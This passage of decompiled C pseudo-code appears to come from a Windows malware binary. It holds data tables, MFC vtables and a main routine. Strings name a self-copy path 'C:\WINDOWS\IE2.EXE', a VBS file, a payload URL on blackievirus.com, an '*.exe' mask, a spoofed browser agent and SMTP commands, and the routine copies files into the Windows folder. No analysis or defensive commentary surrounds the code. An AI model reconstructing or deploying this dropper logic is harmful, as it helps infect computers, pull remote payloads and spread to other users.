  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F'
}; // weak
char byte_41FCF0[] = { '\0' }; // weak
char byte_41FDF0[256] =
{
  '\0',
  '\x01',
  '\x02',
  '\x03',
  '\x04',
  '\x05',
  '\x06',
  '\a',
  '\b',
  '\b',
  '\t',
  '\t',
  '\n',
  '\n',
  '\v',
  '\v',
  '\f',
  '\f',
  '\f',
  '\f',
  '\r',
  '\r',
  '\r',
  '\r',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x10',
  '\x10',
  '\x10',
  '\x10',
  '\x10',
  '\x10',
  '\x10',
  '\x10',
  '\x11',
  '\x11',
  '\x11',
  '\x11',
  '\x11',
  '\x11',
  '\x11',
  '\x11',
  '\x12',
  '\x12',
  '\x12',
  '\x12',
  '\x12',
  '\x12',
  '\x12',
  '\x12',
  '\x13',
  '\x13',
  '\x13',
  '\x13',
  '\x13',
  '\x13',
  '\x13',
  '\x13',
  '\x14',
  '\x14',
  '\x14',
  '\x14',
  '\x14',
  '\x14',
  '\x14',
  '\x14',
  '\x14',
  '\x14',
  '\x14',
  '\x14',
  '\x14',
  '\x14',
  '\x14',
  '\x14',
  '\x15',
  '\x15',
  '\x15',
  '\x15',
  '\x15',
  '\x15',
  '\x15',
  '\x15',
  '\x15',
  '\x15',
  '\x15',
  '\x15',
  '\x15',
  '\x15',
  '\x15',
  '\x15',
  '\x16',
  '\x16',
  '\x16',
  '\x16',
  '\x16',
  '\x16',
  '\x16',
  '\x16',
  '\x16',
  '\x16',
  '\x16',
  '\x16',
  '\x16',
  '\x16',
  '\x16',
  '\x16',
  '\x17',
  '\x17',
  '\x17',
  '\x17',
  '\x17',
  '\x17',
  '\x17',
  '\x17',
  '\x17',
  '\x17',
  '\x17',
  '\x17',
  '\x17',
  '\x17',
  '\x17',
  '\x17',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1C'
}; // weak
int dword_41FEF0[29] =
{
  0,
  1,
  2,
  3,
  4,
  5,
  6,
  7,
  8,
  10,
  12,
  14,
  16,
  20,
  24,
  28,
  32,
  40,
  48,
  56,
  64,
  80,
  96,
  112,
  128,
  160,
  192,
  224,
  0
}; // weak
int dword_41FF64[171] =
{
  0,
  1,
  2,
  3,
  4,
  6,
  8,
  12,
  16,
  24,
  32,
  48,
  64,
  96,
  128,
  192,
  256,
  384,
  512,
  768,
  1024,
  1536,
  2048,
  3072,
  4096,
  6144,
  8192,
  12288,
  16384,
  24576,
  16,
  17,
  18,
  0,
  8,
  7,
  9,
  6,
  10,
  5,
  11,
  4,
  12,
  3,
  13,
  2,
  14,
  1,
  15,
  3,
  4,
  5,
  6,
  7,
  8,
  9,
  10,
  11,
  13,
  15,
  17,
  19,
  23,
  27,
  31,
  35,
  43,
  51,
  59,
  67,
  83,
  99,
  115,
  131,
  163,
  195,
  227,
  258,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  1,
  1,
  1,
  1,
  2,
  2,
  2,
  2,
  3,
  3,
  3,
  3,
  4,
  4,
  4,
  4,
  5,
  5,
  5,
  5,
  0,
  112,
  112,
  1,
  2,
  3,
  4,
  5,
  7,
  9,
  13,
  17,
  25,
  33,
  49,
  65,
  97,
  129,
  193,
  257,
  385,
  513,
  769,
  1025,
  1537,
  2049,
  3073,
  4097,
  6145,
  8193,
  12289,
  16385,
  24577,
  0,
  0,
  0,
  0,
  1,
  1,
  2,
  2,
  3,
  3,
  4,
  4,
  5,
  5,
  6,
  6,
  7,
  7,
  8,
  8,
  9,
  9,
  10,
  10,
  11,
  11,
  12,
  12,
  13,
  13
}; // weak
void *off_420210 = &loc_404770; // weak
void *off_420214 = &loc_404770; // weak
void *off_420218 = &loc_404770; // weak
void (__stdcall __noreturn *off_42021C)(int) = &sub_409690; // weak
int (*off_420220)() = &sub_418000; // weak
int (*off_42022C)() = &sub_418000; // weak
char *off_420238 = "CWinApp"; // weak
void *off_420258 = &unk_420470; // weak
void *_AFX_WIN_STATE::`vftable' = &sub_41C312; // weak
void *CWinApp::`vftable' = &sub_41C613; // weak
char *off_420388 = "CWinThread"; // weak
void *_AFX_CTL3D_STATE::`vftable' = &sub_41C75A; // weak
void *_AFX_CTL3D_THREAD::`vftable' = &sub_41C775; // weak
_UNKNOWN unk_420470; // weak
_UNKNOWN unk_420490; // weak
_UNKNOWN unk_4204C0; // weak
_UNKNOWN unk_4204F8; // weak
_UNKNOWN unk_420510; // weak
_UNKNOWN unk_420520; // weak
char *off_420548 = "CTempGdiObject"; // weak
char *off_420570 = "CTempDC"; // weak
char *off_420590 = "CGdiObject"; // weak
void **off_4205B8 = &off_4205D0; // weak
char *off_4205D8 = "CUserException"; // weak
char *off_420600 = "CResourceException"; // weak
int (*off_420630)() = &sub_41C8F7; // weak
void *CGdiObject::`vftable' = &sub_41C917; // weak
void *CResourceException::`vftable' = &sub_41C870; // weak
void *CUserException::`vftable' = &sub_41C8A8; // weak
void *_AFX_THREAD_STATE::`vftable' = &sub_41CA70; // weak
void *AFX_MODULE_STATE::`vftable' = &sub_41CB98; // weak
void *AFX_MODULE_THREAD_STATE::`vftable' = &sub_41CC47; // weak
char *off_420798 = "CObject"; // weak
void *CStringArray::`vftable' = &sub_41CE02; // weak
char *off_4207D8 = "CArchiveException"; // weak
void *CArchiveException::`vftable' = &sub_41CE18; // weak
char *off_420820 = "CNotSupportedException"; // weak
char *off_420850 = "CMemoryException"; // weak
void *CMemoryException::`vftable' = &sub_41CE1E; // weak
void *CNotSupportedException::`vftable' = &sub_41CE56; // weak
void *_AFX_SOCK_STATE::`vftable' = &sub_41DCD0; // weak
void *CSessionMapPtrToPtr::`vftable' = &sub_41D9B7; // weak
void *CCriticalSection::`vftable' = &sub_41DB99; // weak
void *CThreadData::`vftable' = &sub_41D270; // weak
char *off_420978 = "CTempWnd"; // weak
char *off_4209A0 = "CWnd"; // weak
void *off_4209C0 = &unk_420470; // weak
void *CWnd::`vftable' = &sub_41D5E1; // weak
void *CTestCmdUI::`vftable' = &CTestCmdUI::Enable; // weak
void *CTempWnd::`vftable' = &sub_41D64C; // weak
void *CHandleMap::`vftable' = &sub_40ADED; // weak
char *off_420F30 = "CMapPtrToPtr"; // weak
void *CMapPtrToPtr::`vftable' = &sub_41D9B7; // weak
char *off_420F68 = "CPtrList"; // weak
void *CPtrList::`vftable' = &sub_41D9BD; // weak
char *off_420FB0 = "CCriticalSection"; // weak
char *off_420FC8 = "CSyncObject"; // weak
void *CSyncObject::`vftable' = &sub_41DB9F; // weak
char *off_421020 = "CTempMenu"; // weak
char *off_421048 = "CMenu"; // weak
void *CMenu::`vftable' = &sub_41DBF2; // weak
const char aRuntimeErrorPr[] = "Runtime Error!\n\nProgram: "; // idb
char byte_4215B0[92] =
{
  '\x06',
  '\0',
  '\0',
  '\x06',
  '\0',
  '\x01',
  '\0',
  '\0',
  '\x10',
  '\0',
  '\x03',
  '\x06',
  '\0',
  '\x06',
  '\x02',
  '\x10',
  '\x04',
  'E',
  'E',
  'E',
  '\x05',
  '\x05',
  '\x05',
  '\x05',
  '\x05',
  '5',
  '0',
  '\0',
  'P',
  '\0',
  '\0',
  '\0',
  '\0',
  ' ',
  '(',
  '8',
  'P',
  'X',
  '\a',
  '\b',
  '\0',
  '7',
  '0',
  '0',
  'W',
  'P',
  '\a',
  '\0',
  '\0',
  ' ',
  ' ',
  '\b',
  '\0',
  '\0',
  '\0',
  '\0',
  '\b',
  '`',
  'h',
  '`',
  '`',
  '`',
  '`',
  '\0',
  '\0',
  'p',
  'p',
  'x',
  'x',
  'x',
  'x',
  '\b',
  '\a',
  '\b',
  '\0',
  '\0',
  '\a',
  '\0',
  '\b',
  '\b',
  '\b',
  '\0',
  '\0',
  '\b',
  '\0',
  '\b',
  '\0',
  '\a',
  '\b',
  '\0',
  '\0',
  '\0'
}; // weak
_SCOPETABLE_ENTRY stru_421780[2] = { { -1, NULL, &loc_41197E }, { 0, &loc_41196A, &loc_41196E } }; // weak
const _ThrowInfo _TI4PAVCArchiveException__ = { 0u, NULL, NULL, &_CTA4PAVCArchiveException__ }; // idb
const _ThrowInfo _TI5PAVCMemoryException__ = { 0u, NULL, NULL, &_CTA5PAVCMemoryException__ }; // idb
int (__stdcall *off_4250F0)(int, LPVOID lpMem, SIZE_T dwBytes) = &sub_4036A0; // weak
int (__stdcall *off_4250F4[3])(int, int, int) = { &sub_4042D0, &sub_404A40, &sub_4080E0 }; // weak
char aCWindowsIe2Exe[19] = "C:\\WINDOWS\\IE2.EXE"; // weak
char aC[4] = "C:\\"; // weak
char asc_42530C[2] = "\\"; // weak
_UNKNOWN unk_42530E; // weak
double dbl_42530F = 159744.0; // weak
_DWORD dword_425317[2] = { 1, 0 }; // weak
char aHttpWwwBlackie[34] = "http://www.blackievirus.com/AD.e_"; // weak
char aExe_0[6] = "*.exe"; // weak
char aHttpWwwBlackie_0[28] = "http://www.blackievirus.com"; // weak
char aUrl[6] = "url=\""; // weak
CHAR FileName[] = "C:\\WINDOWS\\HELP2.VBS"; // idb
CHAR aWindir[] = "windir"; // idb
CHAR AppName[] = ""; // idb
double dbl_42551C = 1.048576e7; // weak
double dbl_425524 = -1.0e-7; // weak
char asc_425530[2] = "."; // idb
LPCSTR lpFileName = NULL; // idb
void *lp = NULL; // idb
void *dword_425560 = NULL; // idb
CHAR Caption[] = "error"; // idb
CHAR Text[] = ""; // idb
char asc_4255BC[3] = ""; // weak
char asc_4255C0[3] = ""; // weak
CHAR aBlackmoon[] = "blackmoon"; // idb
CHAR aError_0[] = "ERROR"; // idb
char aD[5] = "%d"; // weak
char aDD[9] = "%d%d"; // weak
char aDDD_0[13] = "%d%d%d"; // weak
char aDDD[13] = "%d%d%d"; // weak
CHAR aWwwDywtComCn[] = "www.dywt.com.cn"; // idb
char aC_0[4] = "%C:"; // idb
CHAR Operation[] = "open"; // idb
CHAR szWindow[] = "Microsoft Internet Explorer"; // idb
char asc_42572C[2] = ""; // weak
char a00[3] = "00"; // weak
CHAR szAgent[] = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"; // idb
CHAR szHeaders[] = "Accept: */*\r\n\r\n"; // idb
char aAccept[15] = "Accept: */* \r\n"; // weak
CHAR szVerb[] = "GET"; // idb
CHAR szVersion[] = "HTTP/1.0"; // idb
unsigned __int8 Control[] = { 35u, 0u }; // idb
int dword_427370 = 1; // weak
char aGb2312[7] = "gb2312"; // weak
char aUsAscii[9] = "us-ascii"; // weak
CHAR asc_427388[] = "?="; // idb
CHAR aGb2312B[] = "=?gb2312?B?"; // idb
CHAR asc_427398[] = "\r\n "; // idb
const char asc_42739C[] = "\r"; // idb
char byte_42739D = '\n'; // weak
char aSS[] = "%s <%s>"; // idb
char a2d2d[] = "%+.2d%.2d"; // idb
char aQuit[7] = "QUIT\r\n"; // weak
CHAR aSmtp_0[] = "SMTP!"; // idb
CHAR aSmtp[] = "SMTP!"; // idb
CHAR asc_427570[] = " "; // idb
CHAR asc_427574[] = "!"; // idb
CHAR asc_427580[] = "!"; // idb
int (__cdecl *off_4276D0)(_DWORD) = &sub_4179D9; // weak
void *off_4276D4 = &unk_4276E8; // weak
void *off_4276D8 = &unk_4276DC; // weak
char *off_4278E0 = "CStringArray"; // weak
int dword_427B24 = 2; // weak
char **off_427BD8 = &off_427BE0; // weak
_UNKNOWN unk_427D88; // weak
int dword_427D8C[89] =
{
  22,
  2,
  2,
  3,
  2,
  4,
  24,
  5,
  13,
  6,
  9,
  7,
  12,
  8,
  12,
  9,
  12,
  10,
  7,
  11,
  8,
  12,
  22,
  13,
  22,
  15,
  2,
  16,
  13,
  17,
  18,
  18,
  2,
  33,
  13,
  53,
  2,
  65,
  13,
  67,
  2,
  80,
  17,
  82,
  13,
  83,
  13,
  87,
  22,
  89,
  11,
  108,
  13,
  109,
  32,
  112,
  28,
  114,
  9,
  6,
  22,
  128,
  10,
  129,
  10,
  130,
  9,
  131,
  22,
  132,
  13,
  145,
  41,
  158,
  13,
  161,
  2,
  164,
  11,
  167,
  13,
  183,
  17,
  206,
  2,
  215,
  11,
  1816,
  12
}; // weak
_DWORD dword_427EF0[30] =
{
  -1073741819,
  11,
  0,
  -1073741795,
  4,
  0,
  -1073741674,
  4,
  0,
  -1073741683,
  8,
  0,
  -1073741682,
  8,
  0,
  -1073741681,
  8,
  0,
  -1073741680,
  8,
  0,
  -1073741679,
  8,
  0,
  -1073741678,
  8,
  0,
  -1073741677,
  8,
  0
}; // weak
int dword_427FA8[] = { 2 }; // weak
char *off_427FAC = "R6002\r\n- floating point not loaded\r\n"; // weak
char *off_428038 = "(null)"; // idb
wchar_t *off_42803C = L"(null)"; // weak
int (__cdecl *off_428040)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = &_fptrap; // weak
int (__cdecl *off_428180)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = &terminate; // weak
void *off_428188 = &off_428188; // weak
LPVOID off_42818C = &off_428188; // idb
int dword_428198 = -1; // weak
void **off_42A1A8 = &off_428188; // weak
int dword_42A1AC = 480; // weak
void *off_42A37C = (void *)0x42A386; // weak
_UNKNOWN unk_42A958; // weak
_UNKNOWN unk_42A970; // weak
int dword_42AD18 = 0; // weak
int dword_42AD1C = 0; // weak
int dword_42AD20 = 0; // weak
int dword_42AD24 = 0; // weak
LPCSTR lpModuleName = NULL; // idb
int dword_42AD2C = 0; // weak
int (*dword_42AD30)(void) = NULL; // weak
int (*dword_42AD34)(void) = NULL; // weak
int (*dword_42AD38)(void) = NULL; // weak
HANDLE hHeap = NULL; // idb
int (*dword_42AD40)(void) = NULL; // weak
char byte_42AD44 = '\0'; // weak
CHAR Str[260] =
{
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0'
}; // weak
LPVOID dword_42AF4C = NULL; // idb
int dword_42AF50 = 0; // weak
int (__stdcall *dword_42AF70)(_DWORD, _DWORD, _DWORD) = NULL; // weak
HANDLE dword_43740C; // idb
int dword_437414; // weak
int (__stdcall *dword_437418)(_DWORD, _DWORD, _DWORD); // weak
int dword_437740; // weak
_UNKNOWN unk_437748; // weak
int dword_43780C; // weak
int (__stdcall *dword_437810)(_DWORD, _DWORD, _DWORD); // weak
int dword_437814; // weak
_UNKNOWN unk_437818; // weak
HANDLE dword_44387C; // idb
CHAR byte_443880[8]; // weak
_UNKNOWN unk_443888; // weak
int dword_44388C; // weak
int dword_443890; // weak
char byte_443898[40]; // weak
char byte_4438C0[40]; // weak
char byte_4438E8[40]; // weak
char byte_443910[40]; // weak
_DWORD dword_443948[38]; // weak
_DWORD dword_4439E0[38]; // weak
char byte_443A78[40]; // weak
char byte_443AA0[40]; // weak
_UNKNOWN unk_443AC8; // weak
_UNKNOWN unk_443ACC; // weak
_DWORD dword_443AD8[38]; // weak
_DWORD dword_443B70[38]; // weak
_UNKNOWN unk_443C08; // weak
_UNKNOWN unk_443C10; // weak
int dword_443C90[1536]; // weak
char byte_445490[40]; // weak
_DWORD dword_4454B8[16]; // weak
_DWORD dword_4454F8[16]; // weak
_DWORD dword_445538[15]; // weak
_DWORD dword_445578[15]; // weak
int dword_4455B4; // weak
int (__stdcall *GetSystemMetrics_0)(int nIndex);
HMONITOR (__stdcall *MonitorFromWindow)(HWND hwnd, DWORD dwFlags);
HMONITOR (__stdcall *MonitorFromRect)(LPCRECT lprc, DWORD dwFlags);
HMONITOR (__stdcall *MonitorFromPoint)(POINT pt, DWORD dwFlags);
BOOL (__stdcall *GetMonitorInfoA)(HMONITOR hMonitor, LPMONITORINFO lpmi);
BOOL (__stdcall *EnumDisplayMonitors)(HDC hdc, LPCRECT lprcClip, MONITORENUMPROC lpfnEnum, LPARAM dwData);
int dword_4455D0; // weak
int dword_4455D4[17]; // weak
struct _RTL_CRITICAL_SECTION stru_445618; // idb
struct _RTL_CRITICAL_SECTION stru_445630; // idb
int dword_4457C8; // weak
int dword_4457CC; // weak
int dword_4457D0; // weak
int dword_445810; // weak
HBITMAP hBitmapChecked; // idb
int dword_445824; // weak
int dword_44582C; // weak
_UNKNOWN unk_44583C; // weak
_UNKNOWN dword_445840; // weak
int dword_445844; // weak
char byte_445850[40]; // weak
int dword_445880; // weak
int dword_445A24; // weak
int dword_445A88; // idb
LPTOP_LEVEL_EXCEPTION_FILTER lpfn; // idb
_UNKNOWN unk_445C84; // weak
char byte_445D24; // weak
char byte_445D25; // weak
char byte_445D26; // weak
char byte_445D27; // weak
char byte_445D29; // weak
char byte_445D2A; // weak
char byte_445D2B; // weak
int dword_446D44; // weak
LONG Addend; // idb
int dword_446D50; // weak
int dword_446D54; // weak
void *dword_446D58; // idb
int dword_446D5C; // weak
LPVOID lpMem; // idb
int dword_446D64; // weak
HANDLE dword_446D68; // idb
int dword_446D6C; // weak
int dword_4470A8; // weak
int dword_4470AC; // weak


//----- (00401000) --------------------------------------------------------
char *__usercall sub_401000@<eax>(_DWORD *a1@<ebx>)
{
  _DWORD *v2; // ecx
  char v3; // al
  int v4; // eax
  int v5; // eax

  if ( !a1 )
    return 0;
  v2 = a1;
  if ( ((unsigned __int8)a1 & 3) == 0 )
    goto LABEL_6;
  do
  {
    v3 = *(_BYTE *)v2;
    v2 = (_DWORD *)((char *)v2 + 1);
    if ( !v3 )
      return (char *)((char *)v2 - 1 - (char *)a1);
  }
  while ( ((unsigned __int8)v2 & 3) != 0 );
  while ( 1 )
  {
    do
    {
LABEL_6:
      v4 = (*v2 + 2130640639) ^ ~*v2;
      ++v2;
    }
    while ( (v4 & 0x81010100) == 0 );
    v5 = *(v2 - 1);
    if ( !(_BYTE)v5 )
      break;
    if ( !BYTE1(v5) )
      return (char *)((char *)v2 - 3 - (char *)a1);
    if ( (v5 & 0xFF0000) == 0 )
      return (char *)((char *)v2 - 2 - (char *)a1);
    if ( (v5 & 0xFF000000) == 0 )
      return (char *)((char *)v2 - 1 - (char *)a1);
  }
  return (char *)((char *)(v2 - 1) - (char *)a1);
}

//----- (0040106B) --------------------------------------------------------
SIZE_T __cdecl sub_40106B(char a1)
{
  int v1; // ecx
  void *v2; // esp
  char *v3; // edi
  char *v4; // esi
  _DWORD *v5; // ebx
  char *v6; // eax
  _BYTE *v7; // edi
  SIZE_T v8; // eax
  unsigned int *v9; // ebx
  const void **v10; // edx
  unsigned int v11; // ecx
  const void *v12; // esi
  int v14; // [esp-4h] [ebp-8h]
  SIZE_T dwBytes; // [esp+0h] [ebp-4h]
  SIZE_T dwBytesa; // [esp+0h] [ebp-4h]
  char vars0; // [esp+4h] [ebp+0h] BYREF

  v2 = alloca(4 * (v1 + 1));
  v3 = &vars0;
  dwBytes = 1;
  v4 = &a1;
  do
  {
    v5 = *(_DWORD **)v4;
    v4 += 4;
    v14 = v1;
    v6 = sub_401000(v5);
    dwBytes += (SIZE_T)v6;
    *(_DWORD *)v3 = v6;
    v3 += 4;
    v1 = v14 - 1;
  }
  while ( v14 != 1 );
  v7 = (_BYTE *)sub_402383(dwBytes);
  v8 = dwBytes;
  v9 = (unsigned int *)&vars0;
  dwBytesa = (SIZE_T)v7;
  v10 = (const void **)&a1;
  do
  {
    v11 = *v9++;
    v12 = *v10++;
    qmemcpy(v7, v12, v11);
    v7 += v11;
    --v8;
  }
  while ( v8 );
  *v7 = 0;
  return dwBytesa;
}
// 401070: variable 'v1' is possibly undefined

//----- (004010C7) --------------------------------------------------------
__int64 __usercall sub_4010C7@<edx:eax>(double a1@<st0>)
{
  return (__int64)a1;
}

//----- (004010EE) --------------------------------------------------------
int __usercall sub_4010EE@<eax>(int *a1@<ebx>)
{
  int v1; // ecx
  int *v2; // ebx
  int result; // eax

  v1 = *a1;
  v2 = a1 + 1;
  result = 0;
  if ( v1 )
  {
    for ( result = *v2; ; result *= *v2 )
    {
      ++v2;
      if ( !--v1 )
        break;
    }
  }
  return result;
}

//----- (00401107) --------------------------------------------------------
void __usercall sub_401107(int *a1@<ebx>)
{
  int v1; // ecx
  int *v2; // ebx
  int i; // eax

  if ( a1 )
  {
    v1 = *a1;
    v2 = a1 + 1;
    if ( v1 )
    {
      for ( i = *v2; ; i *= *v2 )
      {
        ++v2;
        if ( !--v1 )
          break;
      }
    }
  }
}

//----- (00401127) --------------------------------------------------------
int sub_401127()
{
  int v0; // eax
  int v1; // eax
  LPCSTR v2; // eax
  const CHAR *v3; // eax
  LPCSTR v4; // eax
  const CHAR *v5; // eax
  const CHAR *v6; // eax
  const CHAR *v7; // eax
  const CHAR *v8; // eax
  double v9; // st7
  _DWORD *v10; // eax
  _DWORD *v11; // eax
  const CHAR *v12; // eax
  CHAR *v13; // eax
  const CHAR *v14; // eax
  char *v15; // ecx
  void **v16; // ebx
  bool v17; // zf
  int i; // eax
  int v19; // eax
  int v20; // ecx
  int *v21; // ebx
  char *v22; // ebx
  int v23; // ecx
  int v24; // eax
  void *v25; // eax
  int v27; // [esp-14h] [ebp-40h]
  const CHAR *v28; // [esp-Ch] [ebp-38h]
  const CHAR *v29; // [esp-Ch] [ebp-38h]
  signed int v30; // [esp-Ch] [ebp-38h]
  char v31; // [esp-Ch] [ebp-38h]
  char *v32; // [esp-Ch] [ebp-38h]
  int v33; // [esp-Ch] [ebp-38h]
  void *v34; // [esp-8h] [ebp-34h]
  int *v35; // [esp-8h] [ebp-34h]
  _DWORD *v36; // [esp-4h] [ebp-30h]
  void *v37; // [esp-4h] [ebp-30h]
  int v38; // [esp-4h] [ebp-30h]
  _DWORD *v39; // [esp+0h] [ebp-2Ch]
  LPCSTR lpExistingFileName; // [esp+Ch] [ebp-20h]
  const CHAR *lpExistingFileName_4; // [esp+10h] [ebp-1Ch]
  const CHAR *lpExistingFileName_4a; // [esp+10h] [ebp-1Ch]
  CHAR *lpExistingFileName_4b; // [esp+10h] [ebp-1Ch]
  CHAR *lpExistingFileName_4c; // [esp+10h] [ebp-1Ch]
  CHAR *lpExistingFileName_4d; // [esp+10h] [ebp-1Ch]
  void *lp; // [esp+14h] [ebp-18h] BYREF
  void *v47; // [esp+18h] [ebp-14h] BYREF
  int v48; // [esp+1Ch] [ebp-10h] BYREF
  void *v49; // [esp+20h] [ebp-Ch]
  LPCSTR lpNewFileName; // [esp+24h] [ebp-8h]
  LPCSTR lpFileName; // [esp+28h] [ebp-4h]

  lpFileName = 0;
  lpNewFileName = 0;
  v49 = 0;
  v48 = 0;
  if ( ::lpFileName )
    sub_40237D((void *)::lpFileName);
  ::lpFileName = aCWindowsIe2Exe;
  sub_402720(1, 0, 0, 0);
  v0 = sub_402750(2, 1, 0, -2147482879, 999, 0, -2147482879);
  lp = sub_402840(1, COERCE_DOUBLE((unsigned __int64)v0), 0x80000301);
  lpExistingFileName_4 = (const CHAR *)sub_40106B((char)aC);
  if ( lp )
    sub_40237D(lp);
  lpFileName = lpExistingFileName_4;
  sub_402720(1, 0, 0, 0);
  v1 = sub_402750(2, 1, 0, -2147482879, 999, 0, -2147482879);
  lp = sub_402840(1, COERCE_DOUBLE((unsigned __int64)v1), 0x80000301);
  lpExistingFileName_4a = (const CHAR *)sub_40106B((char)aC);
  if ( lp )
    sub_40237D(lp);
  lpNewFileName = lpExistingFileName_4a;
  v47 = sub_402B10();
  lp = sub_402BB0();
  lpExistingFileName_4b = (CHAR *)sub_40106B((char)v47);
  if ( v47 )
    sub_40237D(v47);
  if ( lp )
    sub_40237D(lp);
  v2 = ::lpFileName;
  if ( !::lpFileName )
    v2 = (LPCSTR)&unk_42530E;
  v28 = v2;
  v3 = lpExistingFileName_4b;
  if ( !lpExistingFileName_4b )
    v3 = (const CHAR *)&unk_42530E;
  sub_402C50(2, v3, 0, -2147483644, v28);
  if ( lpExistingFileName_4b )
    sub_40237D(lpExistingFileName_4b);
  v47 = sub_402B10();
  lp = sub_402BB0();
  lpExistingFileName_4c = (CHAR *)sub_40106B((char)v47);
  if ( v47 )
    sub_40237D(v47);
  if ( lp )
    sub_40237D(lp);
  v4 = lpNewFileName;
  if ( !lpNewFileName )
    v4 = (LPCSTR)&unk_42530E;
  v29 = v4;
  v5 = lpExistingFileName_4c;
  if ( !lpExistingFileName_4c )
    v5 = (const CHAR *)&unk_42530E;
